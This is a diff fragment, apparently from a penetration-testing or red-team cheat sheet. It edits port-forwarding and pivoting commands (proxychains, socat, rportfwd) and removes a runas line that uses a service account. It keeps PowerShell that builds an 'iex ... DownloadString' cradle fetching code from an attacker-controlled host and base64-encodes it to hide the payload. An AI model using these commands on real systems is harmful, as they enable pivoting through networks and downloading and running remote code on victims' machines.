@@ -8,9 +8,7 @@ proxychains socat TCP4-LISTEN:1344,fork TCP4:x.x.x.x:1344 #Modify proxychains.co
 ```
 
 ```
-rportfwd 8080 192.168.100.100 80
-proxychains socat TCP4-Listen:1433,fork TCP:192.168.100.199:1433
-runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
+rportfwd 8080 Listener IP 80
 PS C:\Users\Commando> $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://192.168.100.111:8080/a')"
 PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
 ```
